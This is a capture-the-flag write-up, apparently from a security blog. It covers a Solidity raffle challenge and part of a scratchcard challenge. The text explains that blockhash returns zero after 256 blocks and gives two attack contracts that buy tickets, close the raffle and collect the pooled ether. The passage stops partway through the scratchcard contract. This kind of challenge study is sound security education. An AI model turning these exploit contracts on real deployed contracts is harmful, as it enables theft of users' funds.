
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="author" content="F3real" />
        <meta name="keywords" content="ctf,ethereum,solidity" />
        <meta name="description" content="How to solve Blockchain CTF lvl. 12-13" />


    <title>Blockchain CTF Lvl. 12-13 - EnSec blog</title>

    <link href="https://f3real.github.io/theme/css/combined.css" rel="stylesheet" />

    <!-- Feeds -->
</head>
<body data-spy="scroll" data-target="#scrollspy">
    <div id="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar-wrapper-small" class="twitchy-background">
            <ul id="accordion-small" class="sidebar-nav sidebar-nav-small">
                <li>
        <a href="https://f3real.github.io" title="EnSec blog" class="collapsed">
            <span class="fas fa-home"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
        <a href="https://f3real.github.io/archives.html" title="Recent Articles" class="collapsed">
            <span class="fas fa-th-list"></span>
        </a>
    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion-small" href="#collapse-social-small" title="Social" class="collapsed">
                        <i class="fas fa-users padding-small"></i>
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social-small" class="collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github"><i class="fab fa-github-square padding-small"></i></a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin"><i class="fab fa-linkedin padding-small"></i></a>
                    </li>
                </ul></li>
                <li class="nav-divider"></li>
                <li>
        <a href="#" title="Back to top" class="collapsed">
            <span class="fas fa-arrow-up"></span>
        </a>
    </li>
            </ul>
        </nav>
        <nav id="sidebar-wrapper" class="twitchy-background">
            <ul id="accordion" class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="https://f3real.github.io/">
                            <span class="fas fa-home padding-small"></span>
                            EnSec blog
                    </a>
                </li>
                    <li>
                        <a href="https://f3real.github.io/archives.html">
                            <span class="fas fa-th-list padding-small"></span>
                            Archives
                        </a>
                    </li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-social">
                        <i class="fas fa-users padding-small"></i>
                        Contact
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-social" class="sidebar_submenu collapse ">
                    <li>
                        <a href="https://github.com/F3real" title="Github">
                            <i class="fab fa-github-square padding-small"></i>
                            Github
                        </a>
                    </li>
                    <li>
                        <a href="https://www.linkedin.com/in/stefan-ili%C4%87-61a004111" title="Linkedin">
                            <i class="fab fa-linkedin padding-small"></i>
                            Linkedin
                        </a>
                    </li>
                </ul></li>
                
                <li class="nav-divider"></li>
                <li class="panel anti-panel"><ul id="collapse-pages" class="sidebar_submenu collapse ">
                </ul></li>
                <li class="nav-divider"></li>
                <li>
                    <a data-toggle="collapse" data-parent="#accordion" href="#collapse-categories">
                        <i class="fas fa-folder-open padding-small"></i>
                        Categories
                    </a>
                </li>
                <li class="panel anti-panel"><ul id="collapse-categories" class="sidebar_submenu collapse ">
                    <li class="active">
                        <a href="https://f3real.github.io/category/ctf.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            ctf
                            <span class="badge badge-secondary float-right categorybadge">28</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/misc.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            misc
                            <span class="badge badge-secondary float-right categorybadge">15</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/reversing.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            reversing
                            <span class="badge badge-secondary float-right categorybadge">6</span>
                        </a>
                    </li>
                    <li >
                        <a href="https://f3real.github.io/category/tutorial.html">
                            <i class="fas fa-folder-open padding-small"></i>
                            tutorial
                            <span class="badge badge-secondary float-right categorybadge">5</span>
                        </a>
                    </li>
                </ul></li>
            </ul>
        </nav>
        <!-- /#sidebar-wrapper -->
        <!-- open/close sidebar -->
        <button onclick="toggleMenu();return false;" class="btn btn-primary" id="menu-toggle">
            <span id="right-arrow" class="fas fa-chevron-right"  title="expand sidebar"></span>
            <span id="left-arrow" class="fas fa-chevron-left" title="minimize sidebar"></span>
        </button>
       <!-- /open/close sidebar -->

        <!-- Page Content -->
        <div id="page-content-wrapper">
            <div class="container-fluid">
<section id="content">
    <article>
        <div class="row">
            <div class="col-lg-10">
                <header class="page-header">
                    <h1>
                        <a href="https://f3real.github.io/blockchain_ctf1213.html"
                           rel="bookmark"
                           title="Permalink to Blockchain CTF Lvl. 12-13">
                            Blockchain CTF Lvl. 12-13
                        </a>
                        <small>
<div class="post-info">
    <div class="publish-info-block">
        <small>
            <span class="published">
                <i class="fa fa-calendar padding-small"></i><time datetime="2019-03-11T10:01:00+01:00"> Mon 11 March 2019</time>
            </span>
            <span class="category">
                <i class="fa fa-folder-open padding-small"></i><a href="https://f3real.github.io/category/ctf.html">ctf</a>
            </span>
            <span class="tags">
                <i class="fa fa-tags padding-small"></i>
                <a href="https://f3real.github.io/tag/ctf.html">ctf</a> /                 <a href="https://f3real.github.io/tag/ethereum.html">ethereum</a> /                 <a href="https://f3real.github.io/tag/solidity.html">solidity</a>            </span>
        </small>
    </div>
</div><!-- /.post-info -->                        </small>
                    </h1>
                </header>
            </div>
        </div>
        <div class="row">
            <div class="col-lg-10">
                <div class="entry-content">
                    <p>In this post, we will take a look at two new challenges posted in blockchain CTF.</p>
<div class="toc">
<ul>
<li><a href="#raffle">Raffle</a></li>
<li><a href="#scratchcard">Scratchcard</a></li>
</ul>
</div>
<h2 id="raffle">Raffle</h2>
<p>Let's take a look at source code:</p>
<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>

<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../CtfFramework.sol&quot;</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">Raffle</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>CtfFramework<span class="p">{</span>

<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">constant</span><span class="w"> </span>fee<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">;</span>

<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">private </span><span class="nv">admin</span><span class="p">;</span>

<span class="w">    </span>bytes4<span class="w"> </span><span class="kt">private</span><span class="w"> </span>winningTicket<span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">private </span><span class="nv">blocknum</span><span class="p">;</span>

<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">ticketsBought</span><span class="p">;</span>
<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="k">public </span><span class="nv">raffleStopped</span><span class="p">;</span>

<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="o">=&gt;</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>rewards<span class="p">;</span>
<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="o">=&gt;</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>potentialWinner<span class="p">;</span>
<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="o">=&gt;</span>bytes4<span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>ticketNumbers<span class="p">;</span>

<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_ctfLauncher</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_player</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span>
<span class="w">        </span>CtfFramework<span class="p">(</span>_ctfLauncher<span class="p">,</span><span class="w"> </span>_player<span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">;</span>
<span class="w">        </span>admin<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">buyTicket</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>fee<span class="p">){</span>
<span class="w">            </span>winningTicket<span class="w"> </span><span class="o">=</span><span class="w"> </span>bytes4<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">);</span>
<span class="w">            </span>blocknum<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">block.number</span><span class="o">+</span><span class="m m-Decimal">1</span><span class="p">;</span>
<span class="w">            </span>ticketsBought<span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
<span class="w">            </span>raffleStopped<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
<span class="w">            </span>rewards<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">;</span>
<span class="w">            </span>ticketNumbers<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>bytes4<span class="p">((</span><span class="k">msg.value</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>fee<span class="p">)</span><span class="o">/</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">8</span><span class="p">);</span>
<span class="w">            </span>potentialWinner<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">closeRaffle</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>ticketsBought<span class="o">&gt;</span><span class="m m-Decimal">0</span><span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="o">!</span>raffleStopped<span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>blocknum<span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>winningTicket<span class="w"> </span><span class="o">==</span><span class="w"> </span>bytes4<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">));</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">block.number</span><span class="o">&gt;</span>blocknum<span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="o">==</span>admin<span class="w"> </span><span class="o">||</span><span class="w"> </span>rewards<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="o">&gt;</span><span class="m m-Decimal">0</span><span class="p">);</span>
<span class="w">        </span>winningTicket<span class="w"> </span><span class="o">=</span><span class="w"> </span>bytes4<span class="p">(</span>blockhash<span class="p">(</span>blocknum<span class="p">));</span>
<span class="w">        </span>potentialWinner<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
<span class="w">        </span>raffleStopped<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">collectReward</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>raffleStopped<span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>potentialWinner<span class="p">[</span><span class="k">msg.sender</span><span class="p">]);</span>
<span class="w">        </span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">;</span>
<span class="w">        </span><span class="kt">if</span><span class="p">(</span>winningTicket<span class="w"> </span><span class="o">==</span><span class="w"> </span>ticketNumbers<span class="p">[</span><span class="k">msg.sender</span><span class="p">]){</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>rewards<span class="p">[</span><span class="k">msg.sender</span><span class="p">]);</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]);</span><span class="w"> </span>
<span class="w">            </span>rewards<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
<span class="w">            </span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">skimALittleOffTheTop</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_value</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="o">==</span>admin<span class="p">);</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="o">&gt;</span>_value<span class="p">);</span>
<span class="w">        </span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rewards<span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>_value<span class="p">;</span>
<span class="w">        </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>_value<span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="p">(</span><span class="k">msg.value</span><span class="o">&gt;=</span>fee<span class="p">){</span>
<span class="w">            </span><span class="kt">this</span><span class="p">.</span>buyTicket<span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="kt">else</span><span class="w"> </span><span class="kt">if</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">){</span>
<span class="w">            </span><span class="kt">this</span><span class="p">.</span>closeRaffle<span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="kt">else</span><span class="p">{</span>
<span class="w">            </span><span class="kt">this</span><span class="p">.</span>collectReward<span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>

<p>When we call <code>buyTicket</code>, based on <code>msg.value</code> we sent, we get assigned ticketNumber (<code>bytes4((msg.value - fee)/10**8);</code>). Winning ticket number is calculated only in <code>closeRaffle</code> function based on <code>blockhash</code> (<code>bytes4(blockhash(blocknum))</code>).</p>
<p>Also, we have to notice that <code>blocknum</code> is checked to be different then 0 and if it is higher then <code>block.number</code> assigned at the time <code>buyTicket</code> is called.</p>
<p>Another thing to note is that even regular players can close raffle </p>
<div class="highlight"><pre><span></span><code><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="o">==</span>admin<span class="w"> </span><span class="o">||</span><span class="w"> </span>rewards<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="o">&gt;</span><span class="m m-Decimal">0</span><span class="p">);</span>
</code></pre></div>

<p>So how can we exploit this?</p>
<p>The problem lies in using <code>blockhash</code>, it saves values only up to the last 256 blocks. Calling it on the older block will yield 0. This means we can just wait for 256 blocks after which we know the value of winning ticket. The only problem letf to handle is the fact that account that closes raffle is unable to call <code>collectReward</code> function, but this can be bypassed by creating two different attack contracts.</p>
<p>Solution:</p>
<div class="highlight"><pre><span></span><code><span class="k">contract</span><span class="w"> </span><span class="ni">Test</span><span class="p">{</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">getBlockNum</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="k">block.number</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>


<span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>

<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;./Raffle.sol&quot;</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">AttackContract1</span><span class="p">{</span>
<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">owner</span><span class="p">;</span>
<span class="w">    </span>Raffle<span class="w"> </span>raffle<span class="w"> </span><span class="o">=</span><span class="w"> </span>Raffle<span class="p">(</span><span class="mh">0xB410d1087c42d7D8136257B2e4ce966ed64742Ed</span><span class="p">);</span>

<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>owner<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">);</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">attack</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">        </span>raffle<span class="p">.</span>buyTicket<span class="p">.</span>value<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">)();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">claimReward</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
<span class="w">        </span>raffle<span class="p">.</span>collectReward<span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kt">function</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{}</span>
<span class="p">}</span>

<span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>

<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;./Raffle.sol&quot;</span><span class="p">;</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">AttackContract2</span><span class="p">{</span>
<span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">owner</span><span class="p">;</span>
<span class="w">    </span>Raffle<span class="w"> </span>raffle<span class="w"> </span><span class="o">=</span><span class="w"> </span>Raffle<span class="p">(</span><span class="mh">0xB410d1087c42d7D8136257B2e4ce966ed64742Ed</span><span class="p">);</span>

<span class="w">    </span><span class="kt">constructor</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>owner<span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">);</span><span class="w"> </span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">attack</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">);</span>
<span class="w">        </span>raffle<span class="p">.</span>buyTicket<span class="p">.</span>value<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="w"> </span>ether<span class="p">)();</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">closeRaffle</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="p">{</span>
<span class="w">        </span>raffle<span class="p">.</span>closeRaffle<span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>

<p>After creating both attack contract we need to call <code>attack</code> from both, wait for 256 blocks and then close raffle and claim our reward.</p>
<h2 id="scratchcard">Scratchcard</h2>
<p>Source:</p>
<div class="highlight"><pre><span></span><code><span class="k">pragma solidity</span><span class="w"> </span><span class="err">0.4.24</span><span class="p">;</span>

<span class="kt">import</span><span class="w"> </span><span class="s2">&quot;../CtfFramework.sol&quot;</span><span class="p">;</span>

<span class="kt">library</span><span class="w"> </span>Address<span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">isContract</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">account</span><span class="p">)</span><span class="w"> </span><span class="kt">internal</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">size</span><span class="p">;</span>
<span class="w">        </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"> </span>size<span class="w"> </span><span class="o">:=</span><span class="w"> </span>extcodesize<span class="p">(</span>account<span class="p">)</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="kt">return</span><span class="w"> </span>size<span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span><span class="w"> </span><span class="ni">Scratchcard</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>CtfFramework<span class="p">{</span>

<span class="w">    </span><span class="kt">event</span><span class="w"> </span><span class="nv">CardPurchased</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">indexed</span><span class="w"> </span>player<span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">cost</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nv">winner</span><span class="p">);</span>

<span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="o">=&gt;</span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="kt">private</span><span class="w"> </span>winCount<span class="p">;</span>
<span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">private </span><span class="nv">cost</span><span class="p">;</span>


<span class="w">    </span>using<span class="w"> </span>Address<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">address</span><span class="p">;</span>

<span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_ctfLauncher</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="w"> </span><span class="nv">_player</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span>
<span class="w">        </span>CtfFramework<span class="p">(</span>_ctfLauncher<span class="p">,</span><span class="w"> </span>_player<span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>notContract<span class="p">(){</span>
<span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="o">!</span><span class="k">msg.sender</span><span class="p">.</span>isContract<span class="p">(),</span><span class="w"> </span><span class="s2">&quot;Contracts Not Allowed&quot;</span><span class="p">);</span>
<span class="w">        </span>_<span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">play</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>notContract<span class="w"> </span>ctf<span class="p">{</span>
<span class="w">        </span><span class="kt">bool</span><span class="w"> </span><span class="nv">won</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span>
<span class="w">        </span><span class="kt">if</span><span class="p">((</span>now<span class="o">%</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">8</span><span class="p">)</span><span class="o">*</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">10</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">msg.value</span><span class="p">){</span>
<span class="w">            </span>won<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span>
<span class="w">            </span>winCount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="m m-Decimal">1</span><span class="p">;</span>
<span class="w">            </span>cost<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.value</span><span class="p">;</span>
<span class="w">            </span><span class="k">msg.sender</span><span class="p">.</span>transfer<span class="p">(</span>cost<span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="kt">else</span><span class="p">{</span>
<span class="w">            </span>cost<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
<span class="w">            </span>winCount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span>emit<span class="w"> </span>CardPurchased<span class="p">(</span><span class="k">msg.sender</span><span class="p">,</span><span class="w"> </span><span class="k">msg.value</span><span class="p">,</span><span class="w"> </span>won<span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w">    </span>

<span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">checkIfMegaJackpotWinner</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
<span class="w">        </span><span class="kt">return</span><span class="p">(</span>winCount<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="o">&gt;=</span><span class="m m-Decimal">25</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

